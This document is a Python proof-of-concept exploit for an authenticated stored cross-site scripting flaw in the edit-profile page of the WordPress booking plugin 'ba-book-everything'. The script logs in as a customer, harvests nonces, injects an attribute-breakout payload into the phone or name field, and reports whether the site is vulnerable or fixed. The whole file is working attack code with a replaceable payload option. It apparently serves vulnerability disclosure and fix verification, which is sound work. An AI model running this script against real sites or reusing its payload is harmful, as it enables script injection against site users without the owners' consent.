#!/usr/bin/env python3
"""PoC: Authenticated (Customer) Stored XSS.

Chain: POST edit_user_profile (phone/first_name) -> sanitize_text_field only
  -> wp_update_user / update_user_meta -> GET ?inner_page=edit-profile
  -> unescaped value="..." at get_customer_edit_profile_html() (:1216).

Usage:
  python3 poc.py --url http://target/my-account/ --username customer1 --password 'Secret123!'
  python3 poc.py --url http://target/my-account/?inner_page=edit-profile --username c1 --password 'p@ss' --verbose

Only stdlib is used (no pip install needed).
Exit codes: 0 = VULNERABLE, 1 = NOT VULNERABLE / FIXED, 2 = ERROR.
"""

import argparse
import http.cookiejar
import re
import ssl
import sys
import urllib.parse
import urllib.request

DEFAULT_PAYLOAD = '" autofocus onfocus=alert(1) x="'
NONCE_RE = re.compile(r'name=["\']nonce["\']\s+value=["\']([^"\']+)["\']', re.I)
TIMEOUT = 20


def build_opener():
    jar = http.cookiejar.CookieJar()
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPRedirectHandler(),
        urllib.request.HTTPSHandler(context=ctx),
    )
    opener.addheaders = [("User-Agent", "Mozilla/5.0 (PoC)") ]
    return opener, jar


def http_get(opener, url):
    req = urllib.request.Request(url, method="GET")
    with opener.open(req, timeout=TIMEOUT) as r:
        return r.geturl(), r.read().decode("utf-8", "replace")


def http_post(opener, url, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    with opener.open(req, timeout=TIMEOUT) as r:
        return r.geturl(), r.read().decode("utf-8", "replace")


def with_query(base, **params):
    parts = urllib.parse.urlparse(base)
    q = dict(urllib.parse.parse_qsl(parts.query))
    q.update({k: v for k, v in params.items() if v is not None})
    return urllib.parse.urlunparse(parts._replace(query=urllib.parse.urlencode(q)))


def strip_query(base):
    parts = urllib.parse.urlparse(base)
    return urllib.parse.urlunparse(parts._replace(query="", fragment=""))


def extract_nonce(html):
    m = NONCE_RE.search(html)
    return m.group(1) if m else None


def main():
    ap = argparse.ArgumentParser(description="Stored XSS PoC for ba-book-everything edit-profile")
    ap.add_argument("--url", required=True, help="My-Account page URL, e.g. http://target/my-account/")
    ap.add_argument("--username", "--user", dest="username", required=True, help="Customer username (or email)")
    ap.add_argument("--password", "--pass", dest="password", required=True, help="Customer password")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload (default: attribute breakout)")
    ap.add_argument("--field", default="phone", choices=["phone", "first_name", "last_name"],
                    help="Profile field to inject into (default: phone)")
    ap.add_argument("--verbose", "-v", action="store_true")
    args = ap.parse_args()

    base = strip_query(args.url)
    if not urllib.parse.urlparse(base).path.endswith("/"):
        base += "/"
    # keep pretty-permalink path, drop any incoming query (action/inner_page)
    login_url = with_query(base, action="login")
    edit_url = with_query(base, inner_page="edit-profile")

    opener, jar = build_opener()
    log = print if args.verbose else lambda *a, **k: None

    try:
        # 1. GET login page -> nonce (babe-nonce)
        _, login_html = http_get(opener, base)
        nonce_login = extract_nonce(login_html)
        if not nonce_login:
            # try edit URL too (theme may render forms only there)
            _, login_html = http_get(opener, login_url)
            nonce_login = extract_nonce(login_html)
        if not nonce_login:
            print("[-] ERROR: could not find login nonce (is --url the My-Account page?).", file=sys.stderr)
            return 2
        log(f"[.] login nonce: {nonce_login[:12]}...")

        # 2. Login as customer (plugin handler: login_username/login_pw/nonce -> ?action=login)
        _, after_login = http_post(opener, login_url, {
            "login_username": args.username,
            "login_pw": args.password,
            "nonce": nonce_login,
        })
        logged_in = ("wordpress_logged_in_" in str([(c.name) for c in jar]).lower()
                     or "logout" in after_login.lower()
                     or "edit-profile" in after_login.lower()
                     or "babe_login" not in after_login.lower())
        # Fallback check: fetch base again
        _, home = http_get(opener, base)
        if "babe_login" in home.lower() and "logout" not in home.lower():
            print("[-] ERROR: login failed (bad username/password or registration needs email approval).", file=sys.stderr)
            return 2
        print("[+] Logged in as customer.")

        # 3. GET edit-profile -> fresh nonce for my_account_update()
        _, edit_html = http_get(opener, edit_url)
        nonce_update = extract_nonce(edit_html)
        if not nonce_update:
            print("[-] ERROR: could not find edit-profile nonce (need Customer role?).", file=sys.stderr)
            return 2
        log(f"[.] update nonce: {nonce_update[:12]}...")

        # 4. POST profile update with payload (requires first_name && last_name non-empty)
        data = {"nonce": nonce_update, "action": "edit_user_profile",
                "first_name": "PoCFirst", "last_name": "PoCTest", "phone": "00000000"}
        data[args.field] = args.payload
        http_post(opener, base, data)  # handler redirects to ?inner_page=edit-profile&updated=1
        print(f"[+] Submitted payload to field '{args.field}'.")

        # 5. GET edit-profile -> verify reflection
        _, verify = http_get(opener, edit_url)
        if args.payload in verify and 'value="' + args.payload + '"' in verify:
            print("[!] VULNERABLE: raw payload reflected unescaped in value=\"...\" attribute.")
            i = verify.find("onfocus=alert(1)")
            print("    Evidence: ..." + verify[max(0, i-90):i+90].replace("\n", " ") + "...")
            print("    Trigger: reload ?inner_page=edit-profile (autofocus fires onfocus, no click needed).")
            return 0
        if "onfocus=alert(1)" in verify and "&quot;" in verify:
            print("[-] NOT VULNERABLE: payload is escaped (&quot;), fix present (esc_attr).")
            return 1
        if "onfocus=alert(1)" not in verify:
            print("[-] NOT VULNERABLE or payload stripped (sanitization blocks <>; use attribute-breakout payload).")
            return 1
        print("[?] UNCLEAR: manual view-source check needed for onfocus reflection.")
        return 1
    except Exception as e:
        print(f"[-] ERROR: {e}", file=sys.stderr)
        if args.verbose:
            raise
        return 2


if __name__ == "__main__":
    sys.exit(main())
